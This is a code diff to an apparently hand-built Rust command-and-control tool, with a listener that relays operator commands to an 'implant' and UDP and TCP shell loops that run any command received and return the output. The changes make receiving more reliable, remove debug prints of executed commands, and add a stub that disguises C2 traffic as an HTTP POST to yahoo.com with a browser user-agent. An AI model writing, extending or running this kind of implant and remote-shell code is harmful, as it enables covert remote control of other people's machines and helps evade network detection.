@@ -137,6 +137,12 @@ fn listen_udp(lsn: &mut Listener, address: SocketAddr, sb: &mut Arc<Mutex<Shared
 
 // handles interaction with the implant
 // acts as a middleman between the implant and client
+// 0 => Do nothing
+// 
+// 
+// 
+// 
+// 
 fn interact_udp(lsn: &mut Listener, target: SocketAddr, sb: &mut Arc<Mutex<SharedBuffer>>) {
     println!("[+] Connection established by listener {}", lsn.id);
     let mut is_interacting: bool = false;
@@ -146,7 +152,7 @@ fn interact_udp(lsn: &mut Listener, target: SocketAddr, sb: &mut Arc<Mutex<Share
         if is_interacting {
             // checks if client is terminating interaction with target_src
             let cc: u8 = rcv_client_command(lsn, sb);
-            if cc == 6 {
+            if cc == 69 {
                 is_interacting = false;
                 let code: u8 = 69;
                 lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&[code; 1], target);
@@ -196,8 +202,16 @@ fn interact_udp(lsn: &mut Listener, target: SocketAddr, sb: &mut Arc<Mutex<Share
                             let code: u8 = 1;
                             lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&[code; 1], target);
                             lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&sb_copy.buff, target);
+                            let mut bytes = 0;
+                            let mut src = SocketAddr::from(([0, 0, 0, 0], 0));
                             let mut output = [0; 2048];
-                            lsn.udp_sock.as_ref().expect("udp socket not initialized").recv_from(&mut output);
+                            while bytes == 0 {
+                                output = [0; 2048];
+                                (bytes, src) = match lsn.udp_sock.as_ref().expect("udp socket not initialized").recv_from(&mut output) {
+                                        Ok((b, s)) => (b, s),
+                                        Err(e) => (0, SocketAddr::from(([0, 0, 0, 0], 0))),
+                                };
+                            }
                             sb_copy.buff = output.to_vec();
                             flag = false;
                         }
@@ -221,8 +235,16 @@ fn interact_udp(lsn: &mut Listener, target: SocketAddr, sb: &mut Arc<Mutex<Share
                             let code: u8 = 3;
                             lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&[code; 1], target);
                             lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&sb_copy.buff, target);
+                            let mut bytes = 0;
+                            let mut src = SocketAddr::from(([0, 0, 0, 0], 0));
                             let mut output = [0; 2048];
-                            lsn.udp_sock.as_ref().expect("udp socket not initialized").recv_from(&mut output);
+                            while bytes == 0 {
+                                output = [0; 2048];
+                                (bytes, src) = match lsn.udp_sock.as_ref().expect("udp socket not initialized").recv_from(&mut output) {
+                                        Ok((b, s)) => (b, s),
+                                        Err(e) => (0, SocketAddr::from(([0, 0, 0, 0], 0))),
+                                };
+                            }
                             sb_copy.buff = output.to_vec();
                             flag = false;
                         }
@@ -231,7 +253,9 @@ fn interact_udp(lsn: &mut Listener, target: SocketAddr, sb: &mut Arc<Mutex<Share
                         }
                     }
                 },
-                _u8 => todo!(),
+                _u8 => {
+                    thread::sleep(Duration::from_millis(10));
+                }
             }
         }
     }
@@ -337,15 +361,17 @@ fn interact_tcp(lsn: &mut Listener, stream: &mut TcpStream, sb: &mut Arc<Mutex<S
 // 6 => terminate shell on anchovy
 fn rcv_client_command(lsn: &mut Listener, sb: &mut Arc<Mutex<SharedBuffer>>) -> u8 {
     let mut sb_ref = sb.lock().unwrap();
+    let cc = sb_ref.cc;
     // only action needed to be taken inside this function is to send back listener info
-    if sb_ref.cc == 1 {
+    if cc == 1 {
         let mut lsn_info = get_lsn_info(lsn);
         // TODO: send lsn_info back to client
     }
+    if cc != 5 {
+        sb_ref.cc = 0;
+    }
     // just for testing
-    let cc = sb_ref.cc;
-    //let confirm = format!("Control Code Recieved: {cc}");
-    //sb_ref.buff = confirm.as_bytes().to_vec();
+    //println!("Control Code Recieved: {cc}");
     return cc;
 }
 
@@ -374,7 +400,10 @@ pub fn encode_dns(){
 
 // Boiler function for encoding our commands into a http packet
 pub fn encode_http(){
-
+    let method: &str = "POST /searchresult.html HTTP/1.1\r\n";
+    let host: &str = "Host: yahoo.com\r\n";
+    let ua: &str = "User-Agent: Mozilla/5.0\r\n";
+    let at: &str = "Accept-text/xml,text/html,text/plain,image/jpg";
 }
 
 
@@ -420,9 +449,7 @@ pub fn udp_shell(sock: &mut UdpSocket) {
         //Changed to include 1 because there was a bunch
         //being sent that didnt have anything
         let mut cmd = String::from_utf8_lossy(&buffer[..]).to_string();
-        println!("{}", cmd);
         let cmd_out = execute_cmd(cmd);
-        println!("{}", cmd_out);
         sock.send_to(cmd_out.as_bytes(), src);
     }
 }
@@ -455,22 +482,18 @@ pub fn tcp_shell(stream: &mut TcpStream) {
         //Changed to include 1 because there was a bunch
         //being sent that didnt have anything
         let mut cmd = String::from_utf8_lossy(&buffer[..]).to_string();
-        println!("{}", cmd);
         let cmd_out = execute_cmd(cmd);
-        println!("{}", cmd_out);
         stream.write(cmd_out.as_bytes()).unwrap();
     }
 }
 
 // executes a single arbitrary command
 pub fn execute_cmd(s: String) -> String {
-    //println!("{}", s);
     if s.trim().contains(' ') {
         let mut split = s.trim().split_whitespace();
         let head = split.next().unwrap();
         let mut tail: Vec<&str> = split.collect();
         tail.pop();
-        println!("{:?}", tail);
         match head {
             /*"cd" => {
                 // TODO
@@ -491,7 +514,6 @@ pub fn execute_cmd(s: String) -> String {
         tmp = tmp.trim_matches('\0');
         //Trim remaining whitespace
         tmp = tmp.trim();
-        println!("tmp: {}", tmp);
         match tmp {
             "exit" => return String::new(),
             tmp => {
@@ -551,7 +573,7 @@ fn imp_udp(lsn_addr: SocketAddr) {
             Ok((b, s)) => (b, s),
             Err(e) => (0, SocketAddr::from(([0, 0, 0, 0], 0))),
         };
-        if bytes != 0 {
+        if bytes > 0 {
             match cc[0] {
                 // execute single line cmd
                 1 => {
@@ -574,9 +596,9 @@ fn imp_udp(lsn_addr: SocketAddr) {
                         Ok((b, s)) => (b, s),
                         Err(e) => (0, SocketAddr::from(([0, 0, 0, 0], 0))),
                     };
-                    if bytes != 0 {
-                        let cmd_res = usr_mods::dispatch(str::from_utf8(&buffer[..]).unwrap());
-                        sock.send_to(&cmd_res, lsn_addr);
+                    if bytes > 0 {
+                        let mod_res = usr_mods::dispatch(String::from_utf8_lossy(&buffer[..]).as_ref().to_string());
+                        sock.send_to(&mod_res, lsn_addr);
                     }
                 },
                 _u8 => todo!(),
